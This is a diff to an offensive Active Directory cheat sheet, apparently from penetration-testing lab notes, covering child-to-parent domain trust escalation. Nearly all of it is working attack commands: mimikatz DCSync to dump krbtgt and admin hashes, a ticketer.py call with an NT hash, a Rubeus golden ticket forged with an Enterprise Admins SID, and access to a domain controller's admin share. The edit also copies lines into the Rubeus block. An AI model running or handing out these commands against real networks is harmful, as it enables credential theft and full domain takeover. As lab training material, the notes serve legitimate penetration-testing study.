@@ -1539,7 +1539,7 @@ $ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain <domain> -domain-
 - Child -> Parent Trusts (Mimikatz)
 
 ```
-mimikatz # lsadump::dcsync /user:<domain>\krbtgt
+mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
 PS C:\> Get-DomainSID
 PS C:\> Get-DomainGroup -Domain <domain> -Identity "Enterprise Admins" | select distinguishedname,objectsid
 OR
@@ -1555,9 +1555,15 @@ mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOC
 - Child -> Parent Trusts (Rubeus)
 
 ```
+mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
+PS C:\> Get-DomainSID
+PS C:\> Get-DomainGroup -Domain <domain> -Identity "Enterprise Admins" | select distinguishedname,objectsid
+OR
+PS C:\> Get-ADGroup -Identity "Enterprise Admins" -Server "<domain>"
 PS C:\> ls \\academy-ea-dc01.inlanefreight.local\c$
 PS C:\> .\Rubeus.exe golden /rc4:<Child Domain KRBTGT Hash> /domain:<Child Domain> /sid:<Child Domain SID>  /sids:<Enterprise Admins SID> /user:hacker /ptt
 PS C:\> klist
+PS C:\> ls \\academy-ea-dc01.inlanefreight.local\c$
 mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
 mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
 ```
